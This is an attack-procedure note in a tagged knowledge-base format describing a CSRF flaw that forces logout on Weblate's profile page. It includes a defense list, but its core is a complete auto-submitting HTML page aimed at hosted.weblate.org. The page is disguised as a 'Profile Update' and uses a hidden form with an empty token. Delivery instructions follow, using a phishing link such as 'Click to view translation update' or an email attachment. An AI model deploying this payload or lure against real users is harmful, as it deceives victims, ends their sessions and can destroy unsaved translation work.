---
tags:
  - csrf
  - logout
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
skill_level: low
impact_level: medium
detection_risk: low
sub_techniques: []
id: 5c52cf16-8fe1-4565-b5aa-82242e967b00
created_at: '2025-12-14T17:27:15.910Z'
updated_at: '2025-12-14T17:27:15.910Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Trigger-Logout-with-Malicious-CSRF-Payload

## Summary

This procedure exploits a CSRF protection flaw in Weblate's profile page by crafting and delivering an HTML file that submits a POST request with an empty CSRF token, causing the server to log out the authenticated user instead of rejecting the request.

## Description

Weblate, built on Django, mishandles invalid or missing CSRF tokens on the /accounts/profile endpoint by logging out the user rather than denying the request. The attacker creates a simple HTML file with an auto-submitting form targeting this endpoint. When a logged-in victim interacts with the file (e.g., via a link or download), the browser sends the malicious POST, terminating the session. This can lead to loss of unsaved work in translation projects. The attack relies on social engineering for delivery and requires the victim to be authenticated.

## Requirements

1. Knowledge of the target Weblate instance URL (e.g., https://hosted.weblate.org)
2. Ability to host or distribute an HTML file (email, website, etc.)
3. Victim must be logged in during execution

## Defense

Defensive measures and detection strategies:

- Fix CSRF handling to reject invalid tokens without side effects like logout
- Enable proper CSRF token validation in Django middleware
- Log and alert on profile endpoint requests with invalid tokens
- Use Content Security Policy (CSP) to block unexpected form submissions

## Objectives

1. Submit a POST to the profile endpoint with an empty CSRF token
2. Force session termination for the victim
3. Disrupt user activity and cause potential data loss

## Instructions

### Step 1: Craft the Malicious HTML File

**Context**: Create an HTML file that auto-submits a form to the vulnerable endpoint without a valid CSRF token.

Use a text editor to create CSRF.html with the following content:

```html
<!DOCTYPE html>
<html>
<head><title>Profile Update</title></head>
<body>
    <p>Updating your profile...</p>
    <form id="logoutForm" action="https://hosted.weblate.org/accounts/profile" method="post" style="display:none;">
        <input type="hidden" name="csrfmiddlewaretoken" value="">
    </form>
    <script>
        document.getElementById('logoutForm').submit();
    </script>
</body>
</html>
```

> This form hides the submission and uses JavaScript to auto-submit, mimicking a drive-by attack. The empty csrfmiddlewaretoken value triggers the logout.

### Step 2: Distribute the Payload

**Context**: Deliver the file to the victim via a method that encourages interaction while logged into Weblate.

Host CSRF.html on a web server and send a phishing link (e.g., "Click to view translation update"), or attach it to an email. Ensure the victim opens it in their browser while authenticated.

> When loaded, the script executes the POST request in the victim's context, leveraging their session cookies.

### Step 3: Verify Execution

**Context**: Confirm the logout occurred by observing the victim's response or checking server logs (if accessible).

After clicking, the victim should be logged out and see an error or redirect to login.

> Success is indicated by session termination; the server processes the invalid token as a logout action due to the misconfiguration.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[logout]]
- [[web]]
